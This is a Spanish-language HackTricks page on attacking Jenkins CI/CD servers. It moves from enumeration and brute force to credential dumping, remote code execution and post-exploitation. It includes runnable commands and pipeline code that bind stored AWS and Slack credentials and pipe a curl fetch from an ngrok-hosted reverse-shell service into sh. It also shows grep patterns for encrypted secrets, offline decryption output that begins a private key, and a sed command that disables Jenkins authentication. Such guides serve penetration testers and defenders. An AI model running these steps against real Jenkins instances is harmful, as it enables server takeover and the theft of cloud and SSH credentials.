# Jenkins Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informaci칩n B치sica

Jenkins es una herramienta que ofrece un m칠todo sencillo para establecer un entorno de **integraci칩n continua** o **entrega continua** (CI/CD) para casi **cualquier** combinaci칩n de **lenguajes de programaci칩n** y repositorios de c칩digo fuente utilizando pipelines. Adem치s, automatiza varias tareas rutinarias de desarrollo. Aunque Jenkins no elimina la **necesidad de crear scripts para pasos individuales**, proporciona una forma m치s r치pida y robusta de integrar toda la secuencia de herramientas de construcci칩n, prueba y despliegue que uno puede construir manualmente.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Enumeraci칩n No Autenticada

Para buscar p치ginas interesantes de Jenkins sin autenticaci칩n como (_/people_ o _/asynchPeople_, que lista los usuarios actuales) puedes usar:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Verifica si puedes ejecutar comandos sin necesidad de autenticaci칩n:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Sin credenciales, puedes mirar dentro de la ruta _**/asynchPeople/**_ o _**/securityRealm/user/admin/search/index?q=**_ para **nombres de usuario**.

Es posible que puedas obtener la versi칩n de Jenkins desde la ruta _**/oops**_ o _**/error**_.

![](<../../.gitbook/assets/image (146).png>)

### Vulnerabilidades Conocidas

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Inicio de Sesi칩n

En la informaci칩n b치sica puedes verificar **todas las formas de iniciar sesi칩n en Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registro

Podr치s encontrar instancias de Jenkins que **te permiten crear una cuenta e iniciar sesi칩n en ella. Tan simple como eso.**

### **Inicio de Sesi칩n SSO**

Adem치s, si la **funcionalidad**/**plugins** de **SSO** est치n presentes, entonces deber칤as intentar **iniciar sesi칩n** en la aplicaci칩n usando una cuenta de prueba (es decir, una cuenta de **Github/Bitbucket** de prueba). Truco de [**aqu칤**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Fuerza Bruta

**Jenkins** carece de **pol칤tica de contrase침as** y **mitigaci칩n de fuerza bruta de nombres de usuario**. Es esencial **realizar fuerza bruta** a los usuarios ya que **contrase침as d칠biles** o **nombres de usuario como contrase침as** pueden estar en uso, incluso **nombres de usuario invertidos como contrase침as**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Usa [este script de python](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) o [este script de powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Bypass de lista blanca de IP

Muchas organizaciones combinan **sistemas de gesti칩n de control de versiones (SCM) basados en SaaS** como GitHub o GitLab con una **soluci칩n CI interna y autohospedada** como Jenkins o TeamCity. Esta configuraci칩n permite que los sistemas CI **reciban eventos de webhook de los proveedores de control de versiones SaaS**, principalmente para activar trabajos de pipeline.

Para lograr esto, las organizaciones **agregan a la lista blanca** los **rangos de IP** de las **plataformas SCM**, permiti칠ndoles acceder al **sistema CI interno** a trav칠s de **webhooks**. Sin embargo, es importante notar que **cualquiera** puede crear una **cuenta** en GitHub o GitLab y configurarla para **activar un webhook**, enviando potencialmente solicitudes al **sistema CI interno**.

Verifica: [https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/](https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/)

## Abusos internos de Jenkins

En estos escenarios vamos a suponer que tienes una cuenta v치lida para acceder a Jenkins.

{% hint style="warning" %}
Dependiendo del mecanismo de **Autorizaci칩n** configurado en Jenkins y los permisos del usuario comprometido, **podr칤as o no poder realizar los siguientes ataques.**
{% endhint %}

Para m치s informaci칩n, consulta la informaci칩n b치sica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listando usuarios

Si has accedido a Jenkins, puedes listar otros usuarios registrados en [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Extracci칩n de builds para encontrar secretos en texto claro

Usa [este script](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) para extraer las salidas de consola de los builds y las variables de entorno de los builds para encontrar secretos en texto claro.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Robando Credenciales SSH**

Si el usuario comprometido tiene **suficientes privilegios para crear/modificar un nuevo nodo de Jenkins** y las credenciales SSH ya est치n almacenadas para acceder a otros nodos, podr칤a **robar esas credenciales** creando/modificando un nodo y **configurando un host que registrar치 las credenciales** sin verificar la clave del host:

![](<../../.gitbook/assets/image (218).png>)

Normalmente encontrar치s las credenciales ssh de Jenkins en un **proveedor global** (`/credentials/`), as칤 que tambi칠n puedes volcarlas como lo har칤as con cualquier otro secreto. M치s informaci칩n en la [**secci칩n de volcado de secretos**](./#dumping-secrets).

### **RCE en Jenkins**

Obtener un **shell en el servidor de Jenkins** le da al atacante la oportunidad de filtrar todos los **secretos** y **variables de entorno** y de **explotar otras m치quinas** ubicadas en la misma red o incluso **reunir credenciales de la nube**.

Por defecto, Jenkins **se ejecutar치 como SYSTEM**. Por lo tanto, comprometerlo le dar치 al atacante **privilegios de SYSTEM**.

### **RCE Creando/Modificando un proyecto**

Crear/Modificar un proyecto es una forma de obtener RCE sobre el servidor de Jenkins:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Ejecutar script Groovy**

Tambi칠n puedes obtener RCE ejecutando un script Groovy, que podr칤a ser m치s sigiloso que crear un nuevo proyecto:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Creando/Modificando Pipeline

Tambi칠n puedes obtener **RCE creando/modificando un pipeline**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Explotaci칩n de Pipeline

Para explotar pipelines a칰n necesitas tener acceso a Jenkins.

### Construir Pipelines

**Pipelines** tambi칠n pueden ser utilizados como **mecanismo de construcci칩n en proyectos**, en ese caso se puede configurar un **archivo dentro del repositorio** que contendr치 la sintaxis del pipeline. Por defecto se usa `/Jenkinsfile`:

![](<../../.gitbook/assets/image (127).png>)

Tambi칠n es posible **almacenar archivos de configuraci칩n de pipeline en otros lugares** (en otros repositorios, por ejemplo) con el objetivo de **separar** el **acceso** al repositorio y el acceso al pipeline.

Si un atacante tiene **acceso de escritura sobre ese archivo**, podr치 **modificarlo** y **potencialmente activar** el pipeline sin siquiera tener acceso a Jenkins.\
Es posible que el atacante necesite **eludir algunas protecciones de rama** (dependiendo de la plataforma y los privilegios del usuario, podr칤an ser eludidas o no).

Los desencadenantes m치s comunes para ejecutar un pipeline personalizado son:

* **Solicitud de extracci칩n** a la rama principal (o potencialmente a otras ramas)
* **Empujar a la rama principal** (o potencialmente a otras ramas)
* **Actualizar la rama principal** y esperar hasta que se ejecute de alguna manera

{% hint style="info" %}
Si eres un **usuario externo**, no deber칤as esperar crear un **PR a la rama principal** del repositorio de **otro usuario/organizaci칩n** y **activar el pipeline**... pero si est치 **mal configurado**, podr칤as comprometer completamente a las empresas solo explotando esto.
{% endhint %}

### RCE de Pipeline

En la secci칩n anterior de RCE ya se indic칩 una t칠cnica para [**obtener RCE modificando un pipeline**](./#rce-creating-modifying-pipeline).

### Comprobando Variables de Entorno

Es posible declarar **variables de entorno en texto claro** para todo el pipeline o para etapas espec칤ficas. Estas variables de entorno **no deber칤an contener informaci칩n sensible**, pero un atacante siempre podr칤a **revisar todas las configuraciones del pipeline/Jenkinsfiles:**
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

Para obtener informaci칩n sobre c칩mo se tratan generalmente los secretos en Jenkins, consulta la informaci칩n b치sica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Las credenciales pueden estar **alcanzadas a proveedores globales** (`/credentials/`) o a **proyectos espec칤ficos** (`/job/<project-name>/configure`). Por lo tanto, para exfiltrar todos ellos, necesitas **comprometer al menos todos los proyectos** que contienen secretos y ejecutar pipelines personalizados/contaminados.

Hay otro problema, para obtener un **secreto dentro del env** de un pipeline necesitas **conocer el nombre y tipo del secreto**. Por ejemplo, si intentas **cargar** un **secreto** de **`usernamePassword`** como un **secreto** de **`string`**, obtendr치s este **error**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Aqu칤 tienes la forma de cargar algunos tipos de secretos comunes:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Al final de esta p치gina puedes **encontrar todos los tipos de credenciales**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
La mejor manera de **volcar todos los secretos a la vez** es **comprometiendo** la m치quina de **Jenkins** (ejecutando un shell inverso en el **nodo incorporado**, por ejemplo) y luego **filtrando** las **claves maestras** y los **secretos encriptados** y desencript치ndolos sin conexi칩n.\
M치s sobre c칩mo hacer esto en la [secci칩n de Nodos y Agentes](./#nodes-and-agents) y en la [secci칩n de Post Explotaci칩n](./#post-exploitation).
{% endhint %}

### Disparadores

De [la documentaci칩n](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): La directiva `triggers` define las **maneras automatizadas en las que el Pipeline debe ser reactivado**. Para Pipelines que est치n integrados con una fuente como GitHub o BitBucket, `triggers` pueden no ser necesarios ya que la integraci칩n basada en webhooks probablemente ya est칠 presente. Los disparadores actualmente disponibles son `cron`, `pollSCM` y `upstream`.

Ejemplo de Cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **otros ejemplos en la documentaci칩n**.

### Nodos y Agentes

Una **instancia de Jenkins** puede tener **diferentes agentes ejecut치ndose en diferentes m치quinas**. Desde la perspectiva de un atacante, el acceso a diferentes m치quinas significa **diferentes credenciales de nube potenciales** para robar o **diferente acceso a la red** que podr칤a ser abusado para explotar otras m치quinas.

Para m치s informaci칩n, consulta la informaci칩n b치sica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Puedes enumerar los **nodos configurados** en `/computer/`, generalmente encontrar치s el \*\*`Built-In Node` \*\* (que es el nodo que ejecuta Jenkins) y potencialmente m치s:

![](<../../.gitbook/assets/image (249).png>)

Es **especialmente interesante comprometer el nodo incorporado** porque contiene informaci칩n sensible de Jenkins.

Para indicar que deseas **ejecutar** el **pipeline** en el **nodo incorporado de Jenkins**, puedes especificar dentro del pipeline la siguiente configuraci칩n:
```bash
pipeline {
agent {label 'built-in'}
```
### Ejemplo completo

Pipeline en un agente espec칤fico, con un desencadenador cron, con variables de entorno de pipeline y etapa, cargando 2 variables en un paso y enviando un reverse shell:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Lectura de Archivos Arbitrarios a RCE

{% content-ref url="jenkins-arbitrary-file-read-to-rce-via-remember-me.md" %}
[jenkins-arbitrary-file-read-to-rce-via-remember-me.md](jenkins-arbitrary-file-read-to-rce-via-remember-me.md)
{% endcontent-ref %}

## RCE

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Post Explotaci칩n

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

Puedes listar los secretos accediendo a `/credentials/` si tienes suficientes permisos. Ten en cuenta que esto solo listar치 los secretos dentro del archivo `credentials.xml`, pero **los archivos de configuraci칩n de construcci칩n** tambi칠n pueden tener **m치s credenciales**.

Si puedes **ver la configuraci칩n de cada proyecto**, tambi칠n puedes ver all칤 los **nombres de las credenciales (secretos)** que se utilizan para acceder al repositorio y **otras credenciales del proyecto**.

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

Estos archivos son necesarios para **desencriptar los secretos de Jenkins**:

* secrets/master.key
* secrets/hudson.util.Secret

Tales **secretos generalmente se pueden encontrar en**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Aqu칤 hay una regex para encontrarlos:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Decrypt Jenkins secrets offline

Si has volcado las **contrase침as necesarias para descifrar los secretos**, utiliza [**este script**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) **para descifrar esos secretos**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Desencriptar secretos de Jenkins desde Groovy
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Crear un nuevo usuario administrador

1. Accede al archivo Jenkins config.xml en `/var/lib/jenkins/config.xml` o `C:\Program Files (x86)\Jenkins\`
2. Busca la palabra `<useSecurity>true</useSecurity>` y cambia la palabra **`true`** a **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Reinicia** el servidor **Jenkins**: `service jenkins restart`
4. Ahora ve al portal de Jenkins nuevamente y **Jenkins no pedir치 ninguna credencial** esta vez. Navega a "**Manage Jenkins**" para establecer la **contrase침a de administrador nuevamente**.
5. **Habilita** la **seguridad** nuevamente cambiando la configuraci칩n a `<useSecurity>true</useSecurity>` y **reinicia Jenkins nuevamente**.

## Referencias

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
